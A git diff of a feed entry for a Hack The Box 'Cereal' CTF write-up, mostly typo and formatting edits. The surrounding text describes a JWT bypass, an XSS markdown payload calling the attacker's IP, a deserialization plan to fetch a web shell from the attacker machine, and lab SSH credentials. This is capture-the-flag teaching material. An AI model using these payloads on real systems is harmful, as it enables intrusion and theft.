@@ -12,9 +12,9 @@
       <pubDate>Wed, 09 Jun 2021 07:33:40 +0700</pubDate>
       
       <guid>https://fahmifj.github.io/writeups/hackthebox/htb-cereal/</guid>
-      <description>Skills Learned  Code review JWT authentication bypass XSS exploitation .NET deserialization Abusing Windows Access Tokens - SeImpersonate  Tools  Kali Linux 2019.4 (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux GenericPotato - https://github.com/micahvandeusen/GenericPotato  Reconnaissance Nmap All TCP ports scan with nmap discovers three open ports: SSH on port 22, HTTP on port 80, and HTTP on port 443.
-→ root@kali «cereal» «10.10.14.3» $ nmap -p- --min-rate 1000 --reason -oA nmap/10-tcp-allport-cereal 10.</description>
-      <content:encoded><![CDATA[<h3 id="skills-learned">Skills Learned</h3>
+      <description>Chain XSS, SSRF, and Deserialization to land a foothold</description>
+      <content:encoded><![CDATA[<p>This will probably be a long write-up!</p>
+<h3 id="skills-learned">Skills Learned</h3>
 <ul>
 <li>Code review</li>
 <li>JWT authentication bypass</li>
@@ -35,7 +35,7 @@
 $ nmap -p- --min-rate <span style="color:#ae81ff">1000</span> --reason -oA nmap/10-tcp-allport-cereal 10.10.10.217
 Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-06-04 23:45 EDT
 
-....
+...&lt;SNIP&gt;...
 PORT    STATE SERVICE REASON
 22/tcp  open  ssh     syn-ack ttl <span style="color:#ae81ff">127</span>
 80/tcp  open  http    syn-ack ttl <span style="color:#ae81ff">127</span>
@@ -47,7 +47,7 @@ Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</spa
 $ nmap -p 22,80,443 -sC -sV -oA nmap/10-tcp-allport-script 10.10.10.217
 Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-06-04 23:51 EDT
 
-....
+...&lt;SNIP&gt;...
 PORT    STATE SERVICE  VERSION
 22/tcp  open  ssh      OpenSSH for_Windows_7.7 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
 | ssh-hostkey: 
@@ -176,18 +176,18 @@ $ mkdir loot/source-cereal-git <span style="color:#f92672">&amp;&amp;</span> ./g
 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/hooks/applypatch-msg.sample <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/COMMIT_EDITMSG <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/description <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
-...
+...&lt;SNIP&gt;...
 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Finding refs/
 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/ORIG_HEAD <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/config <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/FETCH_HEAD <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/HEAD <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
-...
+...&lt;SNIP&gt;...
 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Finding packs
 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Finding objects
 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching objects
 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/objects/8f/2a1a88f15b9109e1f63e4e4551727bfb38eee5 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
-...
+...&lt;SNIP&gt;...
 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Running git checkout .
 </code></pre></div><h4 id="git-history">Git History</h4>
 <p>I could see the history of this repository by issuing <code>git log</code>.</p>
@@ -197,7 +197,7 @@ $ mkdir loot/source-cereal-git <span style="color:#f92672">&amp;&amp;</span> ./g
 <p>I immediately run <code>git diff 8f2a 7bd9</code>  to compare the first commit with the security fixes which reveals a deleted JWT secret.</p>
 <p><div class="img-container"><img src="imgs/image-20210609090452619.png" alt="image-20210609090452619"  /></div>
 </p>
-<p>It looks like the security fixes includes prevention against deserialization attacks which I&rsquo;ll note that as well as the secret:</p>
+<p>It looks like the security fixes include prevention against deserialization attacks which I&rsquo;ll note that as well as the secret:</p>
 <ul>
 <li>JWT secret: <code>secretlhfIH&amp;FY*#oysuflkhskjfhefesf</code></li>
 </ul>
@@ -237,13 +237,13 @@ Startup.cs  -&gt; Loads appsettings.json
  |
  v
 React client
-</code></pre></div><p>Looking into the <code>appsettings.js</code>, I could obtain the following informations:</p>
+</code></pre></div><p>Looking into the <code>appsettings.js</code>, I could obtain the following information:</p>
 <ul>
 <li>There is IP whitelist</li>
 <li>There are  two rules that looks like limiting requests to <code>/requests</code> endpoint, but it&rsquo;ll reset after certain period.</li>
 </ul>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
-<span style="color:#960050;background-color:#1e0010">....</span>
+<span style="color:#960050;background-color:#1e0010">...&lt;SNIP&gt;...</span>
   <span style="color:#f92672">&#34;AllowedHosts&#34;</span>: <span style="color:#e6db74">&#34;*&#34;</span>,
   <span style="color:#f92672">&#34;ApplicationOptions&#34;</span>: {
     <span style="color:#f92672">&#34;Whitelist&#34;</span>: [ <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#e6db74">&#34;::1&#34;</span> ]
@@ -275,7 +275,7 @@ React client
 </code></pre></div><h4 id="authentication-vulnerability">Authentication Vulnerability</h4>
 <p>The app initialization starts with <code>Startup.cs</code>, scrolling through the file source code, I could see there is a potential authentication bypass.</p>
 <p>On the following snippet code, the app uses JWT for authentication but there is no validation on the issuer and the audience (<a href="https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer">this can cause security issue</a>).</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">....
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">...&lt;SNIP&gt;...
             <span style="color:#66d9ef">var</span> key = Encoding.ASCII.GetBytes(<span style="color:#e6db74">&#34;*&#34;</span>);
             services.AddAuthentication(x =&gt;
             {
@@ -294,7 +294,7 @@ React client
 </span><span style="color:#75715e"></span>                    ValidateAudience = <span style="color:#66d9ef">false</span> <span style="color:#75715e">// &lt;== No validation
 </span><span style="color:#75715e"></span>                };
             });
-....
+...&lt;SNIP&gt;...
 </code></pre></div><p>The JWT token itself is forged at <code>Services/UserService.cs</code>:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"> <span style="color:#66d9ef">public</span> User Authenticate(<span style="color:#66d9ef">string</span> username, <span style="color:#66d9ef">string</span> password)
         {
@@ -325,7 +325,7 @@ React client
             }
 </code></pre></div><p>When the user is trying to authenticate, the code snippet above checks if the user credentials match with the one in database. If the credentials is match, the app will generate a JWT token for that user.  The token contains at least the user&rsquo;s ID and expiration time (7 days).</p>
 <p>The user model is defined in here <code>Models/User.cs</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">....
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">...&lt;SNIP&gt;...
     <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>
     {
 <span style="color:#a6e22e">        [Key]</span>
@@ -336,12 +336,12 @@ React client
         <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">string</span> Password { <span style="color:#66d9ef">get</span>; <span style="color:#66d9ef">set</span>; }
         <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">string</span> Token { <span style="color:#66d9ef">get</span>; <span style="color:#66d9ef">set</span>; }
     }
-....
+...&lt;SNIP&gt;...
 </code></pre></div><p>In <code>ClientApp/src/LoginPage/LoginPage.jsx</code> , the authentication process doesn&rsquo;t need the server validation since it checks the browser&rsquo;s local storage first.</p>
 <blockquote>
 <p>It&rsquo;ll ask the server if we press the login button (POST request).</p>
 </blockquote>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">....
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">...<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">SNIP</span><span style="color:#f92672">&gt;</span>...
 <span style="color:#66d9ef">import</span> { <span style="color:#a6e22e">authenticationService</span> } <span style="color:#a6e22e">from</span> <span style="color:#e6db74">&#39;../_services&#39;</span>; <span style="color:#75715e">// &lt;==
 </span><span style="color:#75715e"></span>
 <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">LoginPage</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">React</span>.<span style="color:#a6e22e">Component</span> {
@@ -358,7 +358,7 @@ React client
         <span style="color:#66d9ef">return</span> (
             <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">div</span><span style="color:#f92672">&gt;</span>
                 <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">h2</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">Login</span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/h2&gt;</span>
-....
+...<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">SNIP</span><span style="color:#f92672">&gt;</span>...
 </code></pre></div><p>I could track the <code>authenticationService.currentUserValue</code> and it is defined in  <code>ClientApp/src/_services/authentication.service.jsx</code></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">currentUserSubject</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">BehaviorSubject</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">localStorage</span>.<span style="color:#a6e22e">getItem</span>(<span style="color:#e6db74">&#39;currentUser&#39;</span>))); <span style="color:#75715e">// &lt;==
 </span><span style="color:#75715e"></span>
@@ -457,7 +457,7 @@ $ go run main.go
 <h3 id="source--code-analysis-2">Source  Code Analysis #2</h3>
 <p>I decided to mix it with images hehe.</p>
 <h4 id="deserialization-vulnerability">Deserialization Vulnerability</h4>
-<p>Looking into the request controller,  <code>Controllers/RequestsController.cs</code>, it turns out that each cereal request (POST) sent is saved in database without validation on the body request.</p>
+<p>Looking into the request controller,  <code>Controllers/RequestsController.cs</code>, it turns out that each Cereal Request (POST) sent is saved in database without validation on the body request.</p>
 <p><div class="img-container"><img src="imgs/image-20210609115652148.png" alt="image-20210609115652148"  /></div>
 </p>
 <p>Because the validation only is on the client side, I could send a cereal request in any format. Here is for example of what I mean:</p>
@@ -466,8 +466,8 @@ $ go run main.go
 <p>The cereal database&rsquo;s name can be found inside  <code>CerealContext.cs</code></p>
 <p><div class="img-container"><img src="imgs/image-20210609120019771.png" alt="image-20210609120019771"  /></div>
 </p>
-<p>Back into the request controller, there is a comment inside the get function that points out about deserialization (previously seen at comparing the commit logs):</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">....
+<p>Back into the request controller, there is a comment inside the <code>Get</code> function that points out about deserialization (previously seen at comparing the commit logs):</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">...&lt;SNIP&gt;...
 <span style="color:#a6e22e">        [Authorize(Policy = &#34;RestrictIP&#34;)]</span>
 <span style="color:#a6e22e">        [HttpGet(&#34;{id}&#34;)]</span>
         <span style="color:#66d9ef">public</span> IActionResult Get(<span style="color:#66d9ef">int</span> id)
@@ -487,19 +487,19 @@ $ go run main.go
                 <span style="color:#66d9ef">return</span> Ok(cereal.ToString());
             }
         }
-</code></pre></div><p>The get function can only be access if the request IP is in the whitelist which is defined in <code>appsettings.json</code> and it takes one parameter called <code>id</code> (GET <code>/requests/{id}</code>).</p>
+</code></pre></div><p>The <code>Get</code> function can only be accessed if the request IP is in the whitelist (defined in <code>appsettings.json</code> ) and it takes one parameter called <code>id</code> (GET <code>/requests/{id}</code>).</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#a6e22e">[Authorize(Policy = &#34;RestrictIP&#34;)]</span>
 <span style="color:#a6e22e">[HttpGet(&#34;{id}&#34;)]</span>
-</code></pre></div><p>This code blocks the gadgets classes used for .NET deserialization attack.</p>
+</code></pre></div><p>This code blocks the gadget classes used for .NET deserialization attack.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>json.ToLower<span style="color:#f92672">()</span>.Contains<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;objectdataprovider&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">||</span> json.ToLower<span style="color:#f92672">()</span>.Contains<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;windowsidentity&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">||</span> json.ToLower<span style="color:#f92672">()</span>.Contains<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;system&#34;</span><span style="color:#f92672">))</span>
 </code></pre></div><p>But, there is a class called <code>DownloadHelper</code> that has a function which can be used to send a download request:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">....
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">...&lt;SNIP&gt;...
     <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DownloadHelper</span>
     {
         <span style="color:#66d9ef">private</span> String <span style="color:#ae81ff">_</span>URL;
         <span style="color:#66d9ef">private</span> String <span style="color:#ae81ff">_F</span>ilePath;
         <span style="color:#66d9ef">public</span> String URL
-....
+...&lt;SNIP&gt;...
         <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> Download()
         {
             <span style="color:#66d9ef">using</span> (WebClient wc = <span style="color:#66d9ef">new</span> WebClient())
@@ -510,18 +510,18 @@ $ go run main.go
                 }
             }
         }
-</code></pre></div><p>I could use <code>DownloadHelper</code> class to download a web shell hosted on my machine by sending a serialized form of this class via cereal request.</p>
+</code></pre></div><p>I could use <code>DownloadHelper</code> class to download a web shell hosted on my machine by sending a serialized form of this class via the Cereal Request.</p>
 <p>The problem here I couldn&rsquo;t make a GET request to <code>requests/{id}</code>  because there is an IP restriction policy.</p>
 <h4 id="xss-vulnerability">XSS Vulnerability</h4>
-<p>When tracking down where the previous SSRF coming, it looks like each cereal request sent lands on the admin page (<code>AdminPage.jsx</code>).</p>
+<p>When tracking down where the previous SSRF coming, it looks like each Cereal Request sent lands on the admin page (<code>AdminPage.jsx</code>).</p>
 <p><div class="img-container"><img src="imgs/image-20210609114906150.png" alt="image-20210609114906150"  /></div>
 </p>
 <p>And one of the app library that is used in the admin page called <code>react-marked-down</code> has an <a href="https://hackerone.com/reports/344069">XSS vulnerability</a>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">....
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">...<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">SNIP</span><span style="color:#f92672">&gt;</span>...
 <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Accordion</span>.<span style="color:#a6e22e">Toggle</span> <span style="color:#a6e22e">as</span><span style="color:#f92672">=</span>{<span style="color:#a6e22e">Button</span>} <span style="color:#a6e22e">variant</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;link&#34;</span> <span style="color:#a6e22e">eventKey</span><span style="color:#f92672">=</span>{<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">props</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">requestId</span>} <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;expand&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span>{<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">props</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">requestId</span>}<span style="color:#f92672">&gt;</span>
     {<span style="color:#a6e22e">requestData</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">requestData</span>.<span style="color:#a6e22e">title</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">requestData</span>.<span style="color:#a6e22e">title</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;string&#39;</span> <span style="color:#f92672">&amp;&amp;</span> 
         <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">MarkdownPreview</span> <span style="color:#a6e22e">markedOptions</span><span style="color:#f92672">=</span>{{ <span style="color:#a6e22e">sanitize</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span> }} <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span>{<span style="color:#a6e22e">requestData</span>.<span style="color:#a6e22e">title</span>} <span style="color:#f92672">/&gt;</span> <span style="color:#75715e">// &lt;==
-</span><span style="color:#75715e"></span>....
+</span><span style="color:#75715e"></span>...<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">SNIP</span><span style="color:#f92672">&gt;</span>...
 </code></pre></div><p>I could confirms the vulnerability with the following payload:</p>
 <pre><code>[XSS](javascript: document.write`&lt;img src='http://10.10.14.3/iamf'/&gt;`)
 </code></pre><p><div class="img-container"><img src="imgs/image-20210605212246743.png" alt="image-20210605212246743"  /></div>
@@ -539,7 +539,7 @@ $ go run main.go
 </ul>
 <p>The tactics:</p>
 <ul>
-<li>Send the <a href="https://docs.microsoft.com/en-us/dotnet/standard/serialization/system-text-json-how-to?pivots=dotnet-5-0">serialized</a> <code>DownloadHelper</code> class which contains a web shell URL that points to the attacking machine via cereal request, note the ID</li>
+<li>Send the <a href="https://docs.microsoft.com/en-us/dotnet/standard/serialization/system-text-json-how-to?pivots=dotnet-5-0">serialized</a> <code>DownloadHelper</code> class which contains a web shell URL that points to the attacking machine via the Cereal Request, note the ID</li>
 <li>Use XSS which bypasses the IP restriction, to make a GET request to <code>cereal.htb/request/{the ID}</code> to trigger the deserialization,</li>
 <li>Confirms the web shell at <code>https://cereal.source.htb/uploads/shell-name.aspx</code></li>
 </ul>
@@ -557,26 +557,26 @@ $ go run main.go
 <p><div class="img-container"><img src="imgs/image-20210609133307066.png" alt="image-20210609133307066"  /></div>
 </p>
 <p>The credentials work on SSH: <code>sonny:mutual.madden.manner38974</code></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.2» 
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «exploits» «10.10.14.2» 
 $ ssh sonny@cereal.htb
-sonny@cereal.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
-Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.17763.1817<span style="color:#f92672">]</span>
-<span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2018</span> Microsoft Corporation. All rights reserved.
+sonny@cereal.htb&#39;s password: 
+Microsoft Windows [Version 10.0.17763.1817]
+(c) 2018 Microsoft Corporation. All rights reserved.
 
-sonny@CEREAL C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>onny&gt;dir desktop<span style="color:#ae81ff">\ </span>
+sonny@CEREAL C:\Users\sonny&gt;dir desktop\ 
  Volume in drive C has no label.                   
  Volume Serial Number is C4EF-2153                 
                                                    
- Directory of C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>onny<span style="color:#ae81ff">\d</span>esktop               
+ Directory of C:\Users\sonny\desktop               
                                                    
 11/16/2020  05:19 AM    &lt;DIR&gt;          .           
 11/16/2020  05:19 AM    &lt;DIR&gt;          ..          
-06/07/2021  09:59 PM                <span style="color:#ae81ff">34</span> user.txt    
-               <span style="color:#ae81ff">1</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>             <span style="color:#ae81ff">34</span> bytes      
-               <span style="color:#ae81ff">2</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>   7,621,619,712 bytes free 
+06/07/2021  09:59 PM                34 user.txt    
+               1 File(s)             34 bytes      
+               2 Dir(s)   7,621,619,712 bytes free 
 </code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
 <p>Still in progress.. but I&rsquo;m too excited to post this.</p>
-<p>[-To be continued&hellip;-]</p>
+<p>[ To be continued&hellip; ]</p>
 <h2 id="references">References</h2>
 <ul>
 <li><a href="https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer">https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer</a></li>
